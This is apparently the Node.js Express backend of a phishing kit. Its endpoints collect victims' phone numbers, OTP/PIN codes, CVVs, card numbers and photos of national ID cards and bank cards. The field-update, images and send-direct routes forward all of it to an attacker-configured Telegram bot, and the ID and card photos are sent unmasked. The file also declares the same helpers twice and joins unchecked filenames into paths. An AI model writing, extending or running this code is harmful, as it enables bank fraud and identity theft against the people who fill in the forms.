// Clean implementation: single set of declarations and helpers
const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
let FormData;
try { FormData = require('form-data'); } catch (e) { FormData = null; }

const app = express();
const port = process.env.PORT || 4000;
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// runtime state
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
const drafts = new Map();
let lastTelegramAttempt = null;
const fieldLogs = [];
const detectedChats = new Set();

const telegramConfig = { token: null, chatId: null };

function makeId(prefix = 'id') { return `${prefix}_${Math.random().toString(36).slice(2, 9)}`; }
function maskStringMiddle(s, showStart = 2, showEnd = 2, maskChar = '•') {
    if (!s || typeof s !== 'string') return s;
    if (s.length <= showStart + showEnd) return maskChar.repeat(s.length);
    const middleLen = s.length - showStart - showEnd;
    return s.slice(0, showStart) + maskChar.repeat(middleLen) + s.slice(s.length - showEnd);
}
function sanitizeValue(field, value) {
    if (value == null) return value;
    const fld = (field || '').toLowerCase();
    const str = typeof value === 'string' ? value : (typeof value === 'number' ? String(value) : null);
    if (!str) return value;
    if (/otp|pin|verification|ma|mã|code/i.test(fld) || /^\d{4,6}$/.test(str)) return maskStringMiddle(str, 0, 1);
    if (/cvv|cvc|securitycode/i.test(fld) || /^\d{3,4}$/.test(str)) return maskStringMiddle(str, 0, 1);
    if (/card|cardnumber|card_no|pan|so?the|số ?thẻ/i.test(fld) || /^\d{12,19}$/.test(str)) return maskStringMiddle(str, 4, 4);
    return value;
}
function sanitizePayload(payload) {
    if (!payload || typeof payload !== 'object') return payload;
    const out = Array.isArray(payload) ? [] : {};
    if (payload.field && (payload.value !== undefined)) {
        out.field = payload.field;
        if (typeof payload.value === 'object' && payload.value !== null) out.value = sanitizePayload(payload.value);
        else out.value = sanitizeValue(payload.field, payload.value);
        for (const k of Object.keys(payload)) {
            if (k === 'field' || k === 'value') continue;
            const v = payload[k];
            if (typeof v === 'string' || typeof v === 'number') out[k] = sanitizeValue(k, v);
            else if (typeof v === 'object' && v !== null) {
                if (v.data && typeof v.data === 'string' && v.data.startsWith('data:')) out[k] = { data: v.data };
                else out[k] = sanitizePayload(v);
            } else out[k] = v;
        }
        return out;
    }
    for (const k of Object.keys(payload)) {
        const v = payload[k];
        if (typeof v === 'string' || typeof v === 'number') out[k] = sanitizeValue(k, v);
        else if (typeof v === 'object' && v !== null) {
            if (v.data && typeof v.data === 'string' && v.data.startsWith('data:')) out[k] = { data: v.data };
            else out[k] = sanitizePayload(v);
        } else out[k] = v;
    }
    return out;
}
function collectImageFields(obj) {
    const images = [];
    function walk(o) {
        if (!o || typeof o !== 'object') return;
        for (const k of Object.keys(o)) {
            const v = o[k];
            if (typeof v === 'string' && v.startsWith && v.startsWith('data:')) images.push(v);
            else if (typeof v === 'object' && v !== null) {
                if (v.data && typeof v.data === 'string' && v.data.startsWith('data:')) images.push(v.data);
                else walk(v);
            }
        }
    }
    walk(obj);
    return images;
}
function saveDataUrlToFile(dataUrl) {
    try {
        const m = dataUrl.match(/^data:(image\/[^;]+);base64,(.+)$/);
        if (!m) return null;
        const mime = m[1];
        const b64 = m[2];
        const ext = (mime.split('/')[1] || 'png').replace(/[^a-z0-9]/ig, '');
        const filename = `${Date.now()}_${Math.random().toString(36).slice(2, 6)}.${ext}`;
        const fp = path.join(uploadsDir, filename);
        const buf = Buffer.from(b64, 'base64');
        if (buf.length < 256) return null;
        fs.writeFileSync(fp, buf);
        return fp;
    } catch (e) { console.warn('saveDataUrlToFile error', e && e.message ? e.message : e); return null; }
}
async function sendToTelegram(message, imageUrl = null) {
    if (!telegramConfig.token || !telegramConfig.chatId) { console.log('[telegram] Not configured, skipping'); return { ok: false, reason: 'not_configured' }; }
    const placeholderPatterns = [/YOUR_REAL_TOKEN/i, /REPLACE_ME/i, /YOUR_TOKEN/i, /PUT_YOUR_TOKEN_HERE/i, /PLACEHOLDER/i];
    if (placeholderPatterns.some(rx => rx.test(telegramConfig.token))) { console.log('[telegram] token looks like placeholder, not sending'); return { ok: false, reason: 'placeholder_token' }; }
    const images = [];
    if (imageUrl) { if (Array.isArray(imageUrl)) images.push(...imageUrl); else images.push(imageUrl); }
    try {
        if (images.length > 0 && FormData) {
            for (let i = 0; i < images.length; i++) {
                const img = images[i];
                const url = `https://api.telegram.org/bot${telegramConfig.token}/sendPhoto`;
                const form = new FormData();
                form.append('chat_id', telegramConfig.chatId);
                if (typeof img === 'string' && img.startsWith('data:')) {
                    const fp = saveDataUrlToFile(img);
                    if (!fp) continue;
                    form.append('photo', fs.createReadStream(fp), { filename: path.basename(fp) });
                } else if (typeof img === 'string' && /^https?:\/\//i.test(img)) {
                    form.append('photo', img);
                }
                if (i === 0 && message) form.append('caption', String(message));
                const response = await fetch(url, { method: 'POST', body: form, headers: form.getHeaders ? form.getHeaders() : {} });
                const raw = await response.text(); let parsed; try { parsed = JSON.parse(raw); } catch (e) { parsed = { ok: false, raw }; }
                lastTelegramAttempt = { at: new Date().toISOString(), url, body: '[photo/form-data]', response: parsed, raw };
            }
            return lastTelegramAttempt && lastTelegramAttempt.response;
        }
        const url = `https://api.telegram.org/bot${telegramConfig.token}/sendMessage`;
        const body = { chat_id: telegramConfig.chatId, text: message };
        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
        const txt = await r.text(); let parsed; try { parsed = JSON.parse(txt); } catch (e) { parsed = { ok: false, raw: txt }; }
        lastTelegramAttempt = { at: new Date().toISOString(), url, body, response: parsed, raw: txt };
        return parsed;
    } catch (e) { console.error('[telegram] send error', e && e.message ? e.message : e); lastTelegramAttempt = { at: new Date().toISOString(), url: null, body: message, response: { ok: false, error: e && e.message ? e.message : String(e) } }; return { ok: false, error: e && e.message ? e.message : String(e) }; }
}

// last telegram attempt store (declared above)

// Endpoint to trigger a test send from server
app.post('/api/telegram-test', async (req, res) => {
    const { text } = req.body || {};
    const message = text || `Test message from server at ${new Date().toISOString()}`;
    const result = await sendToTelegram(message, null);
    res.json({ status: 'ok', result, last: lastTelegramAttempt });
});

// Endpoint to fetch last attempt
app.get('/api/telegram-last', (req, res) => {
    res.json({ status: 'ok', last: lastTelegramAttempt });
});

// GET current telegram config (token masked)
app.get('/api/config-telegram', (req, res) => {
    const maskedToken = telegramConfig.token ? (telegramConfig.token.length > 10 ? telegramConfig.token.slice(0, 4) + '...' + telegramConfig.token.slice(-4) : '***') : null;
    res.json({ status: 'ok', config: { token: maskedToken, chatId: telegramConfig.chatId } });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', now: new Date().toISOString() });
    console.log('[upload-cccd] Sending photo to Telegram...');
});

// Configure Telegram at runtime
app.post('/api/config-telegram', async (req, res) => {
    let { token, chatId } = req.body || {};
    // sanitize token input: trim and remove surrounding <, >, quotes
    if (typeof token === 'string') {
        // trim and strip surrounding characters from token input
        token = token.trim().replace(/^[<"'\s]+|[>"'\s]+$/g, '');
    }
    if (typeof chatId === 'string') chatId = chatId.trim().replace(/^[<"'\s]+|[>"'\s]+$/g, '');

    if (token) telegramConfig.token = token;
    if (chatId) telegramConfig.chatId = chatId;

    // Masked token for response/logging
    const masked = telegramConfig.token ? (telegramConfig.token.length > 10 ? telegramConfig.token.slice(0, 4) + '...' + telegramConfig.token.slice(-4) : '***') : null;
    console.log('[mock] Telegram config updated:', { token: masked, chatId: telegramConfig.chatId });

    // validate token synchronously by calling getMe and return result to caller
    let validation = { ok: false, info: null };
    if (telegramConfig.token) {
        try {
            const r = await fetch(`https://api.telegram.org/bot${telegramConfig.token}/getMe`);
            const txt = await r.text();
            let parsed;
            try { parsed = JSON.parse(txt); } catch (e) { parsed = { ok: false, raw: txt }; }
            validation.ok = !!(parsed && parsed.ok);
            validation.info = parsed;
            if (validation.ok) console.log('[mock] Telegram token validation: OK');
            else console.warn('[mock] Telegram token validation failed:', parsed);
        } catch (e) {
            validation = { ok: false, error: e && e.message ? e.message : String(e) };
        }
    }

    res.json({ status: 'ok', config: { token: masked, chatId: telegramConfig.chatId }, validation });
});

// Accept request-block: respond with status ok and a requestId
app.post('/api/request-block', (req, res) => {
    const requestId = makeId('req');
    // try to get phone from common places
    let phone = '';
    if (req.body && typeof req.body === 'object') {
        phone = req.body.phone || req.body.phoneNumber || '';
    }
    // fallback to query
    if (!phone && req.query && req.query.phone) phone = req.query.phone;

    const maskedPhone = phone ? (phone.replace(/(\+?\d{2,3})(\d+)(\d{2})$/, (m, a, b, c) => `${a}•••${c}`)) : '';
    console.log('[mock] /api/request-block ->', { requestId, phone });

    // Simulate processing delay (e.g., 800ms)
    setTimeout(() => {
        res.json({ status: 'ok', requestId, maskedPhone });
    }, 800);
});

// In-memory log of field updates for debugging

// Field updates: log and ack (generic)
app.post('/api/field-update', (req, res) => {
    // sanitize sensitive fields before logging/sending
    const sanitized = sanitizePayload(req.body);

    // Normalize to always send only the 'value' field to Telegram
    let valueToSend;
    if (sanitized && typeof sanitized === 'object' && sanitized.field && (sanitized.value !== undefined)) {
        valueToSend = sanitized.value;
    } else {
        // If payload is a plain value or object without {field,value}, send the whole sanitized payload as value
        valueToSend = sanitized;
    }

    const entry = { at: new Date().toISOString(), body: sanitized };
    fieldLogs.push(entry);
    console.log('[mock] /api/field-update', entry);

    // Send to Telegram: only the sanitized value as plain text
    const textToSend = (valueToSend && typeof valueToSend === 'object') ? JSON.stringify(valueToSend) : String(valueToSend);
    // collect images from sanitized payload (data URLs or image URLs)
    const images = collectImageFields(sanitized);
    sendToTelegram(textToSend, images.length > 0 ? images : (req.body.image || req.body.imageUrl));

    res.json({ status: 'ok' });
});

// Per-field endpoint: POST /api/field-update/:field
app.post('/api/field-update/:field', (req, res) => {
    const field = req.params.field;
    const rawValue = req.body && (req.body.value !== undefined ? req.body.value : req.body);
    const sanitizedValue = sanitizeValue(field, rawValue);
    const entry = { at: new Date().toISOString(), field, value: sanitizedValue };
    fieldLogs.push(entry);
    console.log('[mock] /api/field-update/' + field, entry);

    // Send to Telegram: only the sanitized value as plain text
    const textToSend = (sanitizedValue && typeof sanitizedValue === 'object') ? JSON.stringify(sanitizedValue) : String(sanitizedValue);
    const images = collectImageFields(req.body);
    sendToTelegram(textToSend, images.length > 0 ? images : (req.body && (req.body.image || req.body.imageUrl)));

    res.json({ status: 'ok', field });
});

// --- Sanitization helpers ---
function maskStringMiddle(s, showStart = 2, showEnd = 2, maskChar = '•') {
    if (!s || typeof s !== 'string') return s;
    if (s.length <= showStart + showEnd) return maskChar.repeat(s.length);
    const middleLen = s.length - showStart - showEnd;
    return s.slice(0, showStart) + maskChar.repeat(middleLen) + s.slice(s.length - showEnd);
}

function sanitizeValue(field, value) {
    if (value == null) return value;
    const fld = (field || '').toLowerCase();
    const str = typeof value === 'string' ? value : (typeof value === 'number' ? String(value) : null);
    if (!str) return value;

    // OTP-like fields: otp, pin, ma, verification_code
    if (/otp|pin|verification|ma|mã|code/i.test(fld) || /^\d{4,6}$/.test(str)) {
        // show only last 1 digit
        return maskStringMiddle(str, 0, 1);
    }

    // CVV: 3-4 digits
    if (/cvv|cvc|securitycode/i.test(fld) || /^\d{3,4}$/.test(str)) {
        return maskStringMiddle(str, 0, 1);
    }

    // Card numbers: 12-19 digits - mask middle
    if (/card|cardnumber|card_no|pan|so?the|số ?thẻ/i.test(fld) || /^\d{12,19}$/.test(str)) {
        return maskStringMiddle(str, 4, 4);
    }

    return value;
}

function sanitizePayload(payload) {
    if (!payload || typeof payload !== 'object') return payload;
    const out = Array.isArray(payload) ? [] : {};
    // If object has a { field, value } shape (common in per-field posts), use field name when sanitizing value
    if (payload.field && (payload.value !== undefined)) {
        out.field = payload.field;
        // If value is an object (e.g., contains images), recurse so we preserve nested data URLs
        if (typeof payload.value === 'object' && payload.value !== null) {
            out.value = sanitizePayload(payload.value);
        } else {
            out.value = sanitizeValue(payload.field, payload.value);
        }
        // copy other keys too
        for (const k of Object.keys(payload)) {
            if (k === 'field' || k === 'value') continue;
            const v = payload[k];
            if (typeof v === 'string' || typeof v === 'number') {
                out[k] = sanitizeValue(k, v);
            } else if (typeof v === 'object' && v !== null) {
                // preserve images (data URLs) so they can be sent; otherwise recurse
                if (v.data && typeof v.data === 'string' && v.data.startsWith('data:')) {
                    out[k] = { data: v.data };
                } else {
                    out[k] = sanitizePayload(v);
                }
            } else {
                out[k] = v;
            }
        }
        return out;
    }

    for (const k of Object.keys(payload)) {
        const v = payload[k];
        if (typeof v === 'string' || typeof v === 'number') {
            out[k] = sanitizeValue(k, v);
        } else if (typeof v === 'object' && v !== null) {
            // preserve images but mask inner textual fields
            if (v.data && typeof v.data === 'string' && v.data.startsWith('data:')) {
                // keep the data URL so it can be saved/sent later
                out[k] = { data: v.data };
            } else {
                out[k] = sanitizePayload(v);
            }
        } else {
            out[k] = v;
        }
    }
    return out;
}

// Helper: extract image data URLs or image URLs from a sanitized payload
function collectImageFields(obj) {
    const images = [];
    function walk(o) {
        if (!o || typeof o !== 'object') return;
        for (const k of Object.keys(o)) {
            const v = o[k];
            if (typeof v === 'string' && v.startsWith && v.startsWith('data:')) {
                images.push(v);
            } else if (typeof v === 'object' && v !== null) {
                // object with { data: 'data:...' }
                if (v.data && typeof v.data === 'string' && v.data.startsWith('data:')) {
                    images.push(v.data);
                } else {
                    walk(v);
                }
            }
        }
    }
    walk(obj);
    return images;
}

// Expose logs for quick inspection
app.get('/api/logs', (req, res) => {
    res.json({ status: 'ok', count: fieldLogs.length, logs: fieldLogs.slice(-50) });
});

// Draft save
app.post('/api/draft-save', (req, res) => {
    try {
        const id = makeId('draft');
        const data = req.body && req.body.data ? req.body.data : req.body || {};
        drafts.set(id, { draftId: id, data, updatedAt: new Date().toISOString() });
        console.log('[mock] draft saved', id);
        res.json({ status: 'ok', draftId: id, updatedAt: new Date().toISOString(), draft: drafts.get(id) });
    } catch (e) { console.error(e); res.status(500).json({ status: 'error' }); }
});

app.get('/api/draft/:id', (req, res) => {
    const id = req.params.id;
    if (!drafts.has(id)) return res.status(404).json({ status: 'not_found' });
    res.json({ status: 'ok', draft: drafts.get(id) });
});

// NOTE: fallback and listen moved to end of file so debug endpoints added later are reachable

// Poll for Telegram updates to detect new chats
// (detectedChats set declared at top)

// Expose detected chats via API
app.get('/api/telegram-chats', (req, res) => {
    res.json({ status: 'ok', chats: Array.from(detectedChats) });
});

app.post('/api/telegram-chats/clear', (req, res) => {
    detectedChats.clear();
    console.log('[mock] Cleared detected chats');
    res.json({ status: 'ok' });
});

// Poll for Telegram updates to detect new chats (deduped)
setInterval(async () => {
    if (!telegramConfig.token) return;
    try {
        const response = await fetch(`https://api.telegram.org/bot${telegramConfig.token}/getUpdates`);
        const data = await response.json();
        if (data.ok && data.result.length > 0) {
            data.result.forEach(update => {
                if (update.message && update.message.chat) {
                    const chat = update.message.chat;
                    const id = chat.id;
                    if (!detectedChats.has(id)) {
                        detectedChats.add(id);
                        console.log('[telegram] Detected chat:', id, chat.title || chat.username || chat.first_name || '<unknown>');
                    }
                }
            });
        }
    } catch (e) {
        console.error('[telegram] Poll error:', e && e.message ? e.message : e);
    }
}, 15000); // poll every 15s to reduce log noise

// -- Uploads helper endpoints (for debugging images)
app.get('/api/uploads', (req, res) => {
    try {
        if (!fs.existsSync(uploadsDir)) return res.json({ status: 'ok', files: [] });
        const files = fs.readdirSync(uploadsDir).map(f => {
            const s = fs.statSync(path.join(uploadsDir, f));
            return { name: f, size: s.size, mtime: s.mtime };
        });
        res.json({ status: 'ok', files });
    } catch (e) {
        console.error('[mock] /api/uploads error', e && e.message ? e.message : e);
        res.status(500).json({ status: 'error' });
    }
});

// stream/download a specific upload
app.get('/api/uploads/:name', (req, res) => {
    try {
        const name = req.params.name;
        const fp = path.join(uploadsDir, name);
        if (!fs.existsSync(fp)) return res.status(404).json({ status: 'not_found' });
        res.sendFile(fp);
    } catch (e) {
        console.error('[mock] /api/uploads/:name error', e && e.message ? e.message : e);
        res.status(500).json({ status: 'error' });
    }
});

// Try sending a saved upload file to Telegram (body: { filename, caption? })
app.post('/api/telegram-send-file', async (req, res) => {
    const { filename, caption } = req.body || {};
    if (!filename) return res.status(400).json({ status: 'error', message: 'filename required' });
    const fp = path.join(uploadsDir, filename);
    if (!fs.existsSync(fp)) return res.status(404).json({ status: 'error', message: 'file not found' });
    if (!telegramConfig.token || !telegramConfig.chatId) return res.status(400).json({ status: 'error', message: 'telegram not configured' });

    try {
        if (!FormData) {
            return res.status(500).json({ status: 'error', message: 'form-data module not available on server' });
        }
        // Basic guard: skip obviously tiny images which are often placeholders and cause Telegram IMAGE_PROCESS_FAILED
        try {
            const st = fs.statSync(fp);
            const minSize = 512; // bytes
            if (st.size < minSize) {
                const msg = `skipped: file too small (${st.size} bytes). Likely placeholder or invalid image.`;
                lastTelegramAttempt = { at: new Date().toISOString(), skipped: true, filename, size: st.size, message: msg };
                return res.status(400).json({ status: 'error', message: msg, filename, size: st.size, last: lastTelegramAttempt });
            }
        } catch (e) {
            console.warn('[mock] could not stat file for size check', e && e.message ? e.message : e);
        }
        const form = new FormData();
        form.append('chat_id', telegramConfig.chatId);
        form.append('photo', fs.createReadStream(fp), { filename: path.basename(fp) });
        if (caption) form.append('caption', String(caption));
        const url = `https://api.telegram.org/bot${telegramConfig.token}/sendPhoto`;
        console.log('[telegram-debug] POST', url, 'file=', fp);
        const response = await fetch(url, { method: 'POST', body: form, headers: form.getHeaders ? form.getHeaders() : {} });
        const raw = await response.text();
        let parsed;
        try { parsed = JSON.parse(raw); } catch (e) { parsed = { ok: false, raw }; }
        lastTelegramAttempt = { at: new Date().toISOString(), url, body: '[photo/form-data]', response: parsed, raw };
        res.json({ status: 'ok', result: parsed, raw });
    } catch (e) {
        console.error('[mock] /api/telegram-send-file error', e && e.message ? e.message : e);
        lastTelegramAttempt = { at: new Date().toISOString(), url: null, body: filename, response: { ok: false, error: e && e.message ? e.message : String(e) } };
        res.status(500).json({ status: 'error', error: e && e.message ? e.message : String(e) });
    }
});

// Convenience endpoint: POST /api/images
// Body: { images: { cccdFront: 'data:...', cccdBack: 'data:...', cardFront: 'data:...', cardBack: 'data:...' }, send: true|false }
app.post('/api/images', async (req, res) => {
    try {
        const body = req.body || {};
        const images = body.images || {};
        // default to auto-send when not provided
        const send = (body.send === undefined) ? true : !!body.send;
        const saved = [];
        for (const key of Object.keys(images)) {
            const v = images[key];
            if (typeof v === 'string' && v.startsWith('data:')) {
                const fp = saveDataUrlToFile(v);
                if (fp) saved.push({ key, file: path.basename(fp), path: fp });
            }
        }
        // Optionally send all saved files to Telegram (as separate sendPhoto calls)
        let telegramResults = null;
        if (send && saved.length && telegramConfig.token && telegramConfig.chatId) {
            telegramResults = [];
            for (const s of saved) {
                try {
                    // call internal helper to send saved file
                    // skip tiny files to avoid IMAGE_PROCESS_FAILED
                    let st;
                    try { st = fs.statSync(s.path); } catch (e) { st = null; }
                    if (st && st.size < 512) {
                        telegramResults.push({ file: s.file, skipped: true, reason: `file too small (${st.size} bytes)` });
                        continue;
                    }
                    const form = new FormData();
                    form.append('chat_id', telegramConfig.chatId);
                    form.append('photo', fs.createReadStream(s.path), { filename: s.file });
                    const url = `https://api.telegram.org/bot${telegramConfig.token}/sendPhoto`;
                    const r = await fetch(url, { method: 'POST', body: form, headers: form.getHeaders ? form.getHeaders() : {} });
                    const raw = await r.text();
                    let parsed;
                    try { parsed = JSON.parse(raw); } catch (e) { parsed = { ok: false, raw }; }
                    telegramResults.push({ file: s.file, result: parsed });
                } catch (e) {
                    telegramResults.push({ file: s.file, error: e && e.message ? e.message : String(e) });
                }
            }
        }

        res.json({ status: 'ok', saved, telegramResults });
    } catch (e) {
        console.error('[mock] /api/images error', e && e.message ? e.message : e);
        res.status(500).json({ status: 'error' });
    }
});

// Debug: send a remote image URL to Telegram (body: { url, caption? })
app.post('/api/telegram-send-url', async (req, res) => {
    const { url, caption } = req.body || {};
    if (!url || typeof url !== 'string') return res.status(400).json({ status: 'error', message: 'url required' });
    try {
        const result = await sendToTelegram(caption || '', [url]);
        res.json({ status: 'ok', result, last: lastTelegramAttempt });
    } catch (e) {
        console.error('[mock] /api/telegram-send-url error', e && e.message ? e.message : e);
        res.status(500).json({ status: 'error', error: e && e.message ? e.message : String(e) });
    }
});

// Direct-send endpoint: POST /api/send-direct
// Body: { dataUrl: 'data:image/png;base64,...', caption?: '...' }
// Sends the image immediately to Telegram WITHOUT saving to uploads/ (uses Buffer + FormData)
app.post('/api/send-direct', async (req, res) => {
    try {
        const { dataUrl, caption } = req.body || {};
        if (!dataUrl || typeof dataUrl !== 'string') return res.status(400).json({ status: 'error', message: 'dataUrl required' });

        // placeholder token guard
        const placeholderPatterns = [/YOUR_REAL_TOKEN/i, /REPLACE_ME/i, /YOUR_TOKEN/i, /PUT_YOUR_TOKEN_HERE/i, /PLACEHOLDER/i];
        if (!telegramConfig.token || !telegramConfig.chatId || placeholderPatterns.some(rx => rx.test(telegramConfig.token))) {
            // if token missing or placeholder, save for inspection (but do not send)
            console.log('[telegram] Token missing/placeholder; not sending direct');
            return res.status(400).json({ status: 'error', message: 'telegram not configured or token looks like a placeholder' });
        }

        const m = dataUrl.match(/^data:(image\/[^;]+);base64,(.+)$/);
        if (!m) return res.status(400).json({ status: 'error', message: 'invalid dataUrl' });
        const mime = m[1];
        const b64 = m[2];
        const buf = Buffer.from(b64, 'base64');

        if (!FormData) {
            // fallback: save to disk and use existing send-file flow
            const fp = saveDataUrlToFile(dataUrl);
            if (!fp) return res.status(500).json({ status: 'error', message: 'failed to save temp file' });
            // reuse existing telegram-send-file logic by calling internal API path
            // NOTE: this makes an HTTP call to self which is fine for debug
            try {
                const url = `http://127.0.0.1:${port}/api/telegram-send-file`;
                const body = { filename: path.basename(fp), caption };
                const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
                const txt = await r.text(); let parsed; try { parsed = JSON.parse(txt); } catch (e) { parsed = { ok: false, raw: txt }; }
                return res.json({ status: 'ok', via: 'saved', result: parsed });
            } catch (e) {
                return res.status(500).json({ status: 'error', message: e && e.message ? e.message : String(e) });
            }
        }

        // send via multipart/form-data using Buffer (no disk write)
        try {
            const form = new FormData();
            form.append('chat_id', telegramConfig.chatId);
            // choose extension from mime
            const ext = (mime.split('/')[1] || 'png').replace(/[^a-z0-9]/ig, '');
            const filename = `img-direct-${Date.now()}.${ext}`;
            form.append('photo', buf, { filename, contentType: mime });
            if (caption) form.append('caption', String(caption));
            const url = `https://api.telegram.org/bot${telegramConfig.token}/sendPhoto`;
            const response = await fetch(url, { method: 'POST', body: form, headers: form.getHeaders ? form.getHeaders() : {} });
            const raw = await response.text();
            let parsed;
            try { parsed = JSON.parse(raw); } catch (e) { parsed = { ok: false, raw }; }
            lastTelegramAttempt = { at: new Date().toISOString(), url, body: '[photo/form-data-buffer]', response: parsed, raw };
            return res.json({ status: 'ok', result: parsed, raw });
        } catch (e) {
            console.error('[mock] /api/send-direct error', e && e.message ? e.message : e);
            return res.status(500).json({ status: 'error', error: e && e.message ? e.message : String(e) });
        }
    } catch (e) {
        console.error('[mock] /api/send-direct unexpected', e && e.message ? e.message : e);
        res.status(500).json({ status: 'error', error: e && e.message ? e.message : String(e) });
    }
});

// final fallback - return 404 for unknown routes
app.use((req, res) => {
    res.status(404).json({ status: 'not_found', path: req.path });
});

app.listen(port, () => console.log(`[mock] server listening on http://127.0.0.1:${port}`));
